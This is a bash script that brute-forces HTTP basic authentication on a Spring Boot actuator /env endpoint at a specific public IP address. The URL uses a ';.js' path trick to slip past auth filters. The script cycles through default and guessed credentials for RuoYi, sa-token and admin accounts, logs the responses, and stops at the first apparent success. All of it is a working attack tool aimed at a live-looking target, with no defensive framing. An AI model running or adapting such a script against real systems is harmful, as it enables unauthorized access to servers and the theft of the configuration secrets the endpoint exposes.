#!/bin/bash
URL='http://144.123.22.234:9080/prod-api/actuator;.js/env'
creds=("ruoyi:123456" "ruoyi:ruoyi" "ruoyi:admin" "jydsj:123456" "jydsj:Jydsj@2024" "admin:ruoyi" "sa-token:sa-token" "admin:sa-token")
: > basic_results.log
for c in "${creds[@]}"; do
  u="${c%%:*}"; p="${c#*:}"
  out=$(curl -s -o /tmp/nul -w '%{http_code}|%{size_download}' -u "$u:$p" "$URL" 2>/dev/null)
  body=$(curl -s -u "$u:$p" "$URL" | head -c 120 | tr '\n' ' ')
  echo "[$c] status|size=$out body=$body" | tee -a basic_results.log
  if [ "${out%%|*}" != "401" ] || ! echo "$body" | grep -q 'no basic auth'; then
    echo ">>> POSSIBLE HIT: $c" | tee -a basic_results.log
    break
  fi
  sleep 2
done
